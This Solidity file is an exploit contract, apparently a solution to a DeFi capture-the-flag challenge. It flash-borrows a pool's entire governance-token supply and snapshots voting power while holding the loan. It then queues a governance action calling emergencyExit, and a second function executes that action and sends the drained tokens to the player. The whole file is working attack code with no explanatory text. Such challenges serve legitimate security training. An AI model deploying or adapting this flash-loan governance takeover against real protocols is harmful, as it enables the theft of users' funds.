// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ISimpleGovernance {
    function queueAction(address target, uint128 value, bytes calldata data) external returns (uint256 actionId);
    function executeAction(uint256 actionId) external payable returns (bytes memory);
}

interface ISelfiePool {
    function flashLoan(
        address _receiver,
        address _token,
        uint256 _amount,
        bytes calldata _data
    ) external returns (bool);
    function emergencyExit(address receiver) external;
}

interface IGovernanceToken {
    // transfer function interface
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external returns (uint256);
    function approve(address account, uint256 amount) external;
    function snapshot() external returns (uint256 lastSnapshotId);
}

contract SelfiePoolHack {

    address private player;
    ISimpleGovernance private simpleGovernance;
    ISelfiePool private selfiePool;
    IGovernanceToken private governanceToken;
    uint256 private actionId;
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    error UnauthorisedCaller();
    error InvalidCall();
    error InvalidToken();
    error FeeNotZero();

    constructor(address playerAddress, address simpleGovernanceAddress, 
        address selfiePoolAddress, address tokenAddress) {
        player = playerAddress;
        simpleGovernance = ISimpleGovernance(simpleGovernanceAddress);
        selfiePool = ISelfiePool(selfiePoolAddress);
        governanceToken = IGovernanceToken(tokenAddress);
    }

    function executeQueueAction() external {
        if(msg.sender != player)
            revert UnauthorisedCaller();
        bytes memory response = simpleGovernance.executeAction(actionId);
        uint balance =  governanceToken.balanceOf(address(this));
        governanceToken.transfer(player, balance);
    }


    function attack() external {
        if(msg.sender != player)
            revert UnauthorisedCaller();
        uint amount = governanceToken.balanceOf(address(selfiePool));
        bytes memory data;
        // approve
        governanceToken.approve(address(selfiePool), amount);
        selfiePool.flashLoan(
            address(this),
            address(governanceToken),
            amount,
            data
        );
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        if(msg.sender != address(selfiePool))
            revert UnauthorisedCaller();
        if(token != address(governanceToken))
            revert InvalidToken();
         if(fee != 0)
            revert FeeNotZero();
        // Checks for amount and fee can be skipped
        governanceToken.snapshot();
        bytes memory data = abi.encodeWithSelector(ISelfiePool.emergencyExit.selector, address(this));
        actionId = simpleGovernance.queueAction(address(selfiePool), 0, data);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

}